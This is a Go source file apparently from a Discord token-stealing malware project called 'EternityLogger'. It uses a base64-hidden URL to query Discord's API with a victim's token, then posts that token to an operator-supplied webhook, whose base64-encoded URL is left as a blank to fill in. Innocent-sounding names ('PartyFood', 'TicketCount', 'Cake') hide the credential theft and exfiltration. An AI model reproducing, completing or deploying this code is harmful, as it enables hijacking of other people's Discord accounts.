package requests

import (
	"EternityLogger/utils"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func PartyFood(token string) string {

	food := "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjgvdXNlcnMvQG1lL2NoYW5uZWxz"

	url := utils.Cake(food)

	req, _ := http.NewRequest("GET", url, nil)

	req.Header.Add("Host", "discord.com")
	req.Header.Add("Authorization", token)

	utils.PartyInvitation()
	res, _ := http.DefaultClient.Do(req)

	defer res.Body.Close()
	body, _ := ioutil.ReadAll(res.Body)

	return string(body)

}

func TicketCount(token string) {

	//Encode Webhook URL to Base64 and put it here
	ticket := ""

	url := utils.Cake(ticket)
	method := "POST"

	payload := strings.NewReader("{\"content\": \"||" + token + "||\",\"embeds\": null}")

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		fmt.Println(err)
		return
	}
	req.Header.Add("User-Agent", "Other")
	req.Header.Add("Content-Type", "application/json")

	utils.PartyInvitation()
	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer res.Body.Close()

}
